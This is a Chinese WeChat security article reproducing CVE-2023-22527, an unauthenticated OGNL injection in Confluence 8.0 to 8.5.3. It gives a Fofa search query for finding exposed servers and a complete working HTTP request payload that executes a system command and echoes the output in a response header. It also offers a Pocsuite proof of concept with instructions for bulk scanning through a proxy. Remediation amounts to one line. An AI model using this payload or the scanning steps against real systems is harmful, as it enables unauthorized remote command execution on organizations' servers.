<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/j31AdeWGeLixkkzA8m8E8A)

**免责声明：**该公众号大部分文章来自作者日常学习，也有部分文章是经过作者授权和其他公众号白名单转载，如需转载，请联系公众号。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

0x01 前言

在 Confluence 8.0 到 8.5.3 版本之间，存在一处由于任意 velocity 模板被调用导致的 OGNL 表达式注入漏洞，未授权攻击者利用该漏洞可以直接攻击 Confluence 服务器并执行任意命令。

0x02 影响平台

```
>= v8.0 && <= v8.5.3

```

0x03 漏洞复现

```
Fofa: app="ATLASSIAN-Confluence"

```

首页：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaSDDFHzXvIF3GlVUhggSkViam5Iun4q7DjfDcx5Q2Vqqfp7tiaClbeN190ibjuSJiaWnyx2I0ujA1ialZQ/640?wx_fmt=png&from=appmsg)

构造带回显 payload，发送数据包

```
POST /template/aui/text-inline.vm HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 285
label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaSDDFHzXvIF3GlVUhggSkViaqbmy6NKIaibl197BEAegN9licy8BPLAXThZxkc2iaGcz9VqzD5ibqJK15g/640?wx_fmt=png&from=appmsg)

0x04 修复建议  

```
关注厂商更新产品：
https://confluence.atlassian.com

```

‍‍0x05 参考链接

```
https://nvd.nist.gov/vuln/detail/CVE-2023-22527

```

‍  

关注公众号回复 **CVE-2023-22527** 获取 Pocsuite 框架 POC

使用方法：pocsuite -r CVE-2023-22527.py -u [url]

```
pocsuite3安装(python3环境)
pip3 install pocsuite3
设置代理
pocsuite -r POC.py -u [url] --proxy http://IP:PORT
批量验证
pocsuite -r POC.py -f [file.txt]

```